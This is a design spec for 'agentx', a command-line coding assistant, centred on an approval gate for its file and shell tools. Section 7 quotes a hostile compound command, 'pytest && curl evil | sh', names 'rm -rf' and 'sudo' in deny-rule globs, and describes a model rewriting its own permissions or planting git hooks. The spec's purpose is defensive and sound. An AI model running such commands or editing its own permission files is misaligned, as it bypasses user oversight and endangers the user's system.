# The `agentx` command-line coding assistant (sub-project 1 of 3)

Status: design, approved section by section on 2026-10-10. Target release: 3.7.0 (new command, one new
base dependency; unreleased).
Builds on: `AgentRunner` (`stream()`), `DefaultTools` / `Permissions`, `Session`, `GPT` / `Claude`.

## 1. Problem

The framework has everything a terminal coding assistant needs and no terminal front end:

- `AgentRunner.stream()` already emits `thought`, `tool_call`, `tool_result`, `final` and `completion`
  events.
- `DefaultTools` ships path-sandboxed `read_path`, `list_directory`, `find_files`, `grep`, `write_file`,
  `edit_file`, `delete_path`, `move_file`, `run_python` and `run_shell`.
- `Session` saves and resumes a conversation; `AGENTX.md` is already mentioned in `Config.py` and
  `DefaultTools.py`.
- `pyproject.toml` has no `[project.scripts]`, so `pip install agentx-dev` gives no command.

Anyone who wants "Claude Code, but on this framework's models and tools" has to write the chat loop,
the approval prompts and the session handling themselves.

## 2. Decomposition

"A CLI like Claude Code" is three projects, each with its own spec, plan and build:

1. **Core coding assistant (this spec).** The `agentx` command: chat loop, file and shell tools behind
   approvals, `AGENTX.md` context, sessions, slash commands.
2. **Teams mode (later).** Run a `Supervisor` with helpers from the terminal, with `ask_user` and
   `follow_up`.
3. **Extensibility (later).** MCP server config, custom commands and hooks, headless mode
   (`agentx -p "task"`).

## 3. Goals and non-goals

Goals:

1. `agentx` in a project folder starts an interactive session: you type a request, the model reads and
   edits files and runs commands in that folder, and you approve anything risky.
2. It ships with the package: `pip install agentx-dev` gives the `agentx` command and
   `python -m agentx_dev`, on Windows, macOS and Linux.
3. It works with GPT and Claude through the framework's own chat models, using API keys from the
   environment.
4. It reuses `AgentRunner`, `DefaultTools`, `Permissions` and `Session`. The new code is the terminal
   front end, the approval gate, slash commands and session handling.
5. Typing feels good: persistent history, multi-line input, Tab completion, a status bar.

Non-goals (this version): teams mode, MCP config, custom commands, hooks, headless `-p`, token
streaming, a full-screen interface, a "never ask" mode.

Success looks like: in a project folder, "add a `--verbose` flag to `cli.py` and run the tests" runs end
to end, with the diff and the test command each shown for approval, and `agentx --continue` picks the
conversation up tomorrow.

## 4. Approaches considered

- **A (chosen): a gate in front of each tool, driven by the existing runner.** The CLI wraps risky tools in
  a gate that asks before running them; the chat loop is a plain loop over `runner.stream()`.
- **B: worker thread plus UI thread with queues.** Allows typing while the agent works and instant
  cancel; far more complex (two threads sharing the terminal and the approval prompts). Later.
- **C: a new agent loop inside the CLI.** Full control but duplicates the framework's engine and drifts
  from it. Rejected.

User interface choice (decided): `rich` for output plus `prompt_toolkit` for input (history, multi-line,
completion, status bar). `prompt_toolkit>=3.0` joins the base dependencies. Rejected: plain `input()`
(poor multi-line and no completion), and a full-screen `textual` interface (too large for v1).

## 5. Structure

A package `agentx_dev/cli/`, one job per file:

| File | Job |
|---|---|
| `__init__.py` | exports `main` |
| `app.py` | `main(argv=None) -> int`: parse flags, build the pieces, run the chat loop |
| `settings.py` | load and merge `~/.agentx/settings.json` and `.agentx/settings.json` |
| `models.py` | choose and build the chat model |
| `context.py` | find `AGENTX.md` files and build the system addendum |
| `tools.py` | build the tool set from `DefaultTools`, sandboxed, then wrap each tool in the gate |
| `approval.py` | the gate: kinds, modes, rules, grants, the decision order, the prompt callback |
| `preview.py` | the text shown at an approval prompt: a unified diff for `write_file` / `edit_file`, the command, the code, the paths |
| `ui.py` | rich rendering of events and diffs; the `prompt_toolkit` prompt |
| `commands.py` | slash command registry and parsing |
| `sessions.py` | session paths, listing, autosave, resume |

Also: `agentx_dev/__main__.py` (`python -m agentx_dev`), `[project.scripts] agentx = "agentx_dev.cli:main"`
and a small additive `Session.stream(user_input)` (section 9).

Flags: `--model NAME`, `--mode default|accept-edits|plan`, `--add-dir PATH` (repeatable), `--continue`
(resume the latest session for this folder), `--resume [ID]` (pick one, or by id), `--version`, `--help`.

Exit codes: 0 normal; 1 setup failure (no API key, not a terminal, unusable `--resume` id); 2 usage error
(an unknown or malformed flag, as `argparse` reports it).

## 6. One turn

1. Read a line from the prompt. A line starting with `/` is a slash command, handled by the CLI.
2. Otherwise it is a message: `session.stream(message)` yields the runner's events; `ui` draws each as it
   arrives.
3. When the model calls a tool, the tool is the gated wrapper (section 7): it runs, asks, or refuses.
4. On the `completion` event the session absorbs the result and autosaves.
5. Ctrl+C during a turn cancels that turn: the conversation up to the last finished turn is kept, the
   interrupted turn is not recorded (the framework records a turn only when it completes), and
   "interrupted" is printed. At an idle prompt Ctrl+C prints a reminder; Ctrl+D or `/exit` leaves. At an
approval prompt Ctrl+C declines that one call only.

## 7. The gate (`approval.py`, `tools.py`)

The CLI builds the tools with every capability on (`Permissions(read_files, list_directories,
write_files, edit_files, delete_files, move_files, execute_python, execute_shell = True,
allowed_paths=[cwd, *add_dirs])`) and relies on the gate for consent. Each tool is rebuilt as a
`StructuredTool` with the same name, `args_schema` and description whose function calls the gate first.

Kinds:

| Kind | Tools | Behaviour |
|---|---|---|
| read | `read_path`, `list_directory`, `find_files`, `grep` | always runs |
| edit | `write_file`, `edit_file` | asks, except in accept-edits mode |
| command | `run_shell`, `run_python` | asks |
| destructive | `delete_path`, `move_file` | always asks, in every mode; no "don't ask again" |

Modes: `default` (ask as above), `accept-edits` (edits run without asking; commands and destructive
still ask), `plan` (reads only).

Decision order, first match wins:

1. a `deny` rule: refuse;
2. mode `plan` and the tool is not a read: refuse with "plan mode: propose a plan, do not change anything";
3. an `allow` rule or a session grant: run (never for a destructive tool: allow rules and grants do not
   apply to `delete_path` and `move_file`, which always ask);
4. mode `accept-edits` and the tool is an edit: run;
5. a read: run;
6. otherwise ask.

Rules are `"tool:glob"` strings matched with `fnmatch` against a per-tool subject: the command for
`run_shell`, the first line of the code for `run_python`, the path for `write_file`, `edit_file` and
`delete_path`, and `"src -> dst"` for `move_file`. A rule without a colon (`"edit_file"`) matches every
call of that tool. Deny rules also apply to reads. Example:
`{"allow": ["run_shell:git status*", "run_shell:pytest*"], "deny": ["run_shell:*rm -rf*", "run_shell:*sudo*"]}`.

Two safety refinements to the matching:

- **Spacing cannot dodge a rule.** The shell subject is the command with every run of whitespace
  collapsed to one space, so `rm   -rf x` matches `*rm -rf*`.
- **Compound commands are never auto-allowed.** A shell command containing `;`, `&`, `|`, a backtick, `$(`,
  `(`, `)`, `<` or `>`, or any character outside printable ASCII (newline, `\r`, other control characters,
  non-breaking and Unicode spaces; tab is fine), is not covered by an `allow` rule or a "don't ask again"
  grant (so a grant for `pytest` cannot approve `pytest && curl evil | sh`); it always asks, and answering
  `a` to it grants nothing. Deny rules still match anywhere in it. The rule covers `run_shell` and every
  command-kind tool that takes a string `command` argument (an MCP bash tool); for a tool the gate does not
  know, a marker in any string argument counts. For any such tool the rule subject is its `command`.
- **Paths are matched in two forms.** For the path tools (and both sides of `move_file`) the gate computes
  the path as written (backslashes as `/`, `./` and `..` folded on the text alone, so `../x` stays `../x`
  and a link `secrets/` stays `secrets/`) and the path resolved against the project folder (links followed,
  relative to the project when inside, absolute otherwise); case is folded on Windows and macOS. `~` is not
  expanded (the tools do not expand it). A **deny** rule refuses the call if either form matches; an
  **allow** rule applies only if both do. A path inside the project is written relative to it in the first
  form too, so `../proj/src/a.py` and the absolute path read `src/a.py`. A pattern is matched as written, and
  also anchored against the project folder when it is absolute or starts with `..` (`../shared/*` also
  matches the absolute path of that folder); a leading `~` in a rule pattern (not in a path the model passes)
  is the home folder. `move_file` is judged in every combination of its two paths' forms. So `deny read_path:.env` cannot be dodged by `./.env`,
  `sub/../.env` or the absolute path, and `read_path:secrets/*` still blocks a link named `secrets`.
  On Windows the gate refuses outright, before any rule: UNC and device paths (`\\host\x`, `\\?\C:\x`,
  `\??\C:\x`), alternate data streams (`file::$DATA`), drive-relative paths (`C:file`) and any path with a
  component ending in a dot or a space (`README.md.`, `. /.env`, `.../x`).
- **A move into a folder is judged at its final path.** `shutil.move` puts the source at
  `destination/<name>` when the destination is an existing folder, so for `move_file` the gate also judges
  `source -> destination/<name>` (the name is the source's, after links are followed and as written), in
  every form, and a deny rule that matches it refuses the move. The prompt subject and the preview title say
  the final path ("Move a to b/a"); a move onto an existing file says "(replaces the existing b)".
- **Unknown tools.** For a tool the gate does not know and that has no string `command`, every string value in
  its arguments (found by an iterative walk, at most 200) is a subject: a deny rule matches if any does, an
  allow rule applies only if all do. Arguments with more than 200 strings or more than 10,000 nodes are
  refused ("too large to check"), not asked about.
- **Limits.** Deny globs on shell commands are best effort: start them with `*`, and a model can spell a
  command another way. A `run_python` rule sees only the first line of the code. Deny rules apply to calls of
  the path tools by name; `grep`, `find_files` and `list_directory` pointed at a folder above a denied file
  can still read its contents or name. Deny rules are a convenience layer, not a secrets vault: keep
  secrets out of the project folder.

`run_python` has no command to take a prefix from, so `a` approves that one call and remembers nothing.

**Environment.** `run_shell` and `run_python` run with the framework's scrubbed environment (the CLI sets no
`subprocess_env_passthrough`): only `PATH`, `HOME`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ`, `TMPDIR`, `TMP`, `TEMP`,
`PYTHONIOENCODING`, `PYTHONUTF8` and, on Windows, `SystemRoot`, `COMSPEC`, `PATHEXT`, `USERPROFILE`, `APPDATA`,
`LOCALAPPDATA`, `windir` are kept. API keys are dropped (the point), and so are `VIRTUAL_ENV`, `SSH_AUTH_SOCK`,
proxy variables, `JAVA_HOME` and every other variable. `run_python` uses `sys.executable`, `agentx`'s own
interpreter, not the project's virtual environment.

The prompt shows the proposed action: a coloured unified diff for `write_file` and `edit_file` (computed
against the file on disk; for a new file, the whole content as additions), the exact command for
`run_shell`, the code for `run_python`, the paths for `delete_path` and `move_file`. Answers:

- `y`: allow this call.
- `a`: don't ask again. For edits it switches the session to accept-edits. For commands it grants the
  command prefix for the session: the first word, or the first two words for `git`, `npm`, `pnpm`,
  `yarn`, `pip`, `cargo`, `go`, `docker`, `make`. It remembers nothing for interpreters, shells and
  wrappers: the file name of the first word (lower-cased, `.exe`/`.cmd`/`.bat`/`.com`/`.ps1` dropped) may
  not start with `python`, `pypy`, `ipython`, `node`, `deno`, `bun`, `tsx`, `ts-node`, `ruby`, `perl`, `php`,
  `lua`, `java`, `dotnet`, `awk`, `gawk`, `rscript`, `cscript`, `wscript`, `mshta`, `pwsh`, `powershell`,
  `bash`, `zsh`, `fish`, `wsl`, `uv`, `uvx`, `pipx`, `npx`, `sudo`, `ssh`, `eval`, `exec`, `xargs`, `nohup`,
  `timeout` or `source` (so `php8.2`, `node18`, `python3.12-dbg` and `/usr/bin/python` count), and may not
  equal `sh`, `su`, `cmd`, `time`, `env`, `call`, `start`, `py` or `.` (equality only, so `shellcheck`
  is fine), nor unless the first word is made only of
  letters, digits and `. _ + / -` (so `CI=1 pytest`, quotes, `$`, globs, braces and backslashes grant
  nothing), nor for `git -c ...` or any two-word command whose second word is an
  option, nor for `npm exec`, `npm x`, `pnpm dlx`, `pnpm exec`, `yarn dlx`, `yarn exec`, nor for compound
  commands, `run_python` or destructive tools: it approves that one call. The prompt offers `a` only when
  the gate can remember (`Request.remember`) and prints what it will remember (`Request.grant`).
- `n`: refuse; an optional reason can follow. Bare Enter, end of input and Ctrl+C count as `n`. An answer that
  is none of `y`, `a`, `n` (or `yes`, `always`, `no`) is not guessed at: the question is asked again.

A refusal is an ordinary tool result, never an error: `"The user declined: <reason>"` (or
`"The user declined this action."`). With no terminal to ask on, everything that would prompt is refused
with "no way to ask the user here".

Sandbox: `allowed_paths` stays as the second line of defence; a path outside it fails in the tool itself.
Deny rules and the sandbox cannot be overridden from the prompt.

**Default deny rules.** The application always adds a set of deny rules to the user's and the project's, so a
model cannot rewrite its own permissions or plant something that runs later, outside the approval prompts.
They refuse `write_file`, `edit_file`, `delete_path` and `move_file` (as source and as destination) on:

- `.git` and everything under it (`.git`, `.git/*`, `*/.git`, `*/.git/*`), at the top of the project and in any
  sub-folder. Git follows a `.git` FILE (`gitdir: ...`), `.git/commondir`, `.git/config` (`core.hooksPath`,
  aliases, `core.fsmonitor`), `.git/hooks/*` and `.git/modules/<sub>/config|hooks/*`, and moving `.git` away and
  back would defeat any narrower rule. The honest reason is that a change under `.git/` is invisible to
  `git status` and `git diff`, unlike an edit to `conftest.py`, a `Makefile` or `package.json`, which the user
  can see in review before running anything, so the approval prompt is the only chance to see it, and the
  default is to refuse outright;
- `.agentx` and everything under it at the top of the project (`.agentx`, `.agentx/*`; the only place the
  project settings are read from), and `~/.agentx` when the tools can reach the home folder: a model must not
  rewrite its own permissions;
- in the home folder, when the tools can reach it (the project is the home folder, or it is an extra folder):
  `~/.gitconfig`, `~/.config/git` and everything under it, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`,
  `~/.profile`, `~/.zshrc`, `~/.zprofile` and `~/.config/fish/config.fish`. Other files outside the project that
  run later are not protected; putting the home folder in reach earns a bold warning that says so.

They hold in every mode, `accept-edits` included, are matched against every spelling of the path the gate
computes (relative, absolute, `./`, `..`, backslashes, links followed, case folded on Windows, short 8.3
names resolved) and are not asked about. Names that merely start alike (`.gitignore`, `.github/`,
`git_notes.txt`) are not denied. Reading those files is still allowed.

**Not covered:** deny rules do not constrain `run_shell` or `run_python`, which can reach any file the shell or
interpreter can. Those always ask unless an allow rule or a "don't ask again" grant covers the command, so
the user sees the command first; the approval prompt, not a deny rule, is the protection there.

**A new conversation is a clean slate.** `/clear`, `/resume` (and a conversation started with
`--continue`/`--resume`) empty the session-wide command grants ("don't ask again") and undo an edit grant: when
the user answered `a` at an edit prompt (which switches the gate to `accept-edits`), the gate returns to the mode
that was in force when the user answered. A mode the user chose, with `--mode`, the settings, `/mode` or Shift+Tab, is kept. The rules
from settings stay. The notice for a new or resumed conversation shows the mode in force. The system
instructions (`AGENTX.md` files) are read again, so a file written by `/init` is used by the next conversation.

## 8. The chat experience (`ui.py`, `commands.py`, `context.py`)

Output: a tool call is one line (`● edit_file src/app.py`); a result is collapsed to its first lines with
"... N more lines"; thoughts are dim; the final answer is rendered as Markdown. **Known limit:** the
framework streams tokens only in text-tool mode (`use_function_calling=False`), not with native function
calling, which newer models need. So v1 shows each step live but the answer appears at the end of the
turn. Token streaming is a later improvement.

Prompt: `prompt_toolkit` with history in `~/.agentx/history`, Alt+Enter for a new line, Enter to send,
Tab completion of `/commands` and paths, and a bottom bar with model, mode, folder and session id.
Shift+Tab cycles the mode.

Slash commands:

| Command | Does |
|---|---|
| `/help` | list commands |
| `/clear` | start a new conversation (a new session file) |
| `/model [name]` | show or switch the model; the history is kept |
| `/mode [name]` | show or set the mode |
| `/resume [id]` | pick or load a saved session |
| `/sessions` | list this folder's sessions |
| `/init` | ask the model to look at the project and draft an `AGENTX.md` |
| `/exit` | leave |

An unknown command prints the list of known ones.

Context: `AGENTX.md` files are read from the working folder up through its parents, then
`~/.agentx/AGENTX.md`; nearer files come last so they win. The climb stops at the first of: the folder that
holds a `.git` entry (its own file is read), the user's home folder, the filesystem root. The concatenation, plus the working folder and
the operating system, is passed as the runner's `system_addendum`, cut at 20,000 characters (nearest
files kept).

Model choice, in order: `--model`, then `settings.model`, then the first API key found in the
environment (`ANTHROPIC_API_KEY`, then `OPENAI_API_KEY`). A name starting with `claude` builds `Claude`,
one starting with `gpt` or `o` followed by a digit builds `GPT`; with no name each class's own default
model is used. Keys come from the environment only.

## 9. Sessions (`sessions.py`, `Session.stream`)

`Session` gains `stream(user_input, **kw)`: it calls `runner.stream(user_input,
chat_history=self.history or None, **kw)`, yields every event, and on the final `completion` event calls
`_absorb` (so history, tool-call log and usage update exactly as `invoke` does). It is additive and has
its own unit test.

Files live under `~/.agentx/sessions/<project>/<UTC timestamp>-<id8>.json`, where `<project>` is the
absolute working folder with path separators and colons replaced by `-`, then `-` and a short hash of the full
resolved path (two folders that differ only in `-` versus a separator keep separate sessions). The session is saved after every
finished turn and on `/exit`. `--continue` loads the newest file for this folder; `--resume` with no id
lists them (newest first, with the first message as a title) and loads the chosen one; `/resume` does the
same inside a session. A missing or unreadable session file is reported and a new session starts.

## 10. Settings (`settings.py`)

`~/.agentx/settings.json` (user) and `.agentx/settings.json` (project):

```json
{
  "model": "claude-sonnet-5-5",
  "mode": "default",
  "addDirs": ["../shared"],
  "permissions": {"allow": ["run_shell:pytest*"], "deny": ["run_shell:*sudo*"]}
}
```

Merge: scalar keys, project over user; `addDirs` and the allow and deny lists are concatenated. A deny
rule from either file wins. `addDirs` entries are made absolute when loaded (`~` is the home folder; relative
entries start at the project for the project file and at the home folder for the user file). A project
file's `addDirs` entry that resolves (symlinks followed) outside the project folder is ignored with a
warning, so a cloned repository cannot widen the tool sandbox; the user's own file and `--add-dir` are not
restricted. A file with invalid JSON is reported by path and ignored. Flags override
settings.

Before the first prompt the app prints every line of `Settings.problems` as a warning. When the project's file
contributes any `allow` rules it lists them as coming from the project's settings and asks once, through the
same short-answer reader the approval prompt uses: `Honour these project rules? [y/N]`. Only `y` / `yes` keeps
them. Bare Enter, end of input, Ctrl+C, a failing reader, or an answer that stays unrecognised after one retry
drops them for the session. A repository's `"allow": ["write_file", "edit_file"]` is accept-edits under another
name, and `"allow": ["run_shell"]` runs every command that is not compound, so they are not taken on trust.
The user's own allow rules are never dropped, and the project's deny rules are always kept (they only
restrict). There is no flag to trust a project; stdin is a terminal here, since the CLI exits otherwise.

A project file cannot loosen the mode: `"mode": "accept-edits"` in the project's settings is ignored with a
warning (set it in your own settings or with `--mode`); `plan` and `default` from the project are honoured.

Extra folders (`addDirs`, `--add-dir`) are resolved to absolute paths, listed in the startup banner, and
reported when they do not exist (they are never created); one that is the filesystem root or the user's home
folder gets a bold warning.

## 11. Errors

- No API key: a short message naming the variables, exit code 1, no traceback.
- Provider errors (rate limit, outage): one red line; the session is kept and the next message retries.
- Not a terminal (`sys.stdin.isatty()` false): "agentx needs an interactive terminal", exit code 1.
- An output stream whose encoding cannot print the symbols (a redirected cp1252 or ASCII stream; a Windows
  console reports UTF-8 and prints them) gets plain markers instead.
- The framework logs a traceback, and text the model chose, when a tool raises. `agentx` keeps the logger off
  the terminal: a handler on the root logger swallows it, and warnings and errors from `agentx_dev` go to
  `~/.agentx/agentx.log` (rotating, control characters escaped, best effort). The log can contain tool errors.
- The input line failing outside a turn (the history file cannot be written, say) prints one clean line and
  falls back to the plain `input()` prompt without history; if that fails too the session ends with code 1.
  An unexpected error escaping the session is one line and exit code 1, never a traceback.
- **Known limits.** `read_path` has no size cap and the conversation is never compacted, so a huge file read
  can make later turns fail until `/clear`.
- An exception inside a turn is printed in one line with the type and message; the session continues.

## 12. Testing

Pure logic, no terminal: the gate's decision order and rule matching, prefix grants, settings merge,
`AGENTX.md` discovery and the size cut, session paths and listing, diff text, slash-command parsing, model
choice, `Session.stream`.

End to end: a scripted `MockModel`, an injected `read_line` function in place of `prompt_toolkit`, an
injected `read_short` (or a scripted `ask`) for approvals, and a rich `Console` writing to a string: a whole turn (message, tool
call, approval, answer, autosave) and a resume. The end-to-end tests inject `read_line` (and `read_short` for
approvals) in place of `prompt_toolkit` and use a string-backed `Console`, so no real terminal is involved.

By hand, on a real terminal (a checklist in the plan): history across runs, Alt+Enter, Tab completion, the
status bar, Ctrl+C mid-turn, the `*` fallback with `PYTHONIOENCODING=cp1252`, and the project-rules question.

## 13. Packaging and docs

`pyproject.toml`: add `prompt_toolkit>=3.0` to `dependencies` and `[project.scripts]`. Docs: a new guide
`docs/guides/cli.md`, plus the README, `docs/getting-started.md`, `docs/reference/api-summary.md` and the
CHANGELOG (3.7.0). `host/data.js` is regenerated.

## 14. Decisions recorded

- Coding assistant first (chosen by the user on 2026-10-10); teams mode and extensibility are later
  sub-projects.
- `rich` plus `prompt_toolkit` (chosen), with `prompt_toolkit` a base dependency.
- Approval model: ask before edits and commands, three modes including `plan`, rules in settings (chosen).
- No token streaming in v1 (framework limit with native function calling).
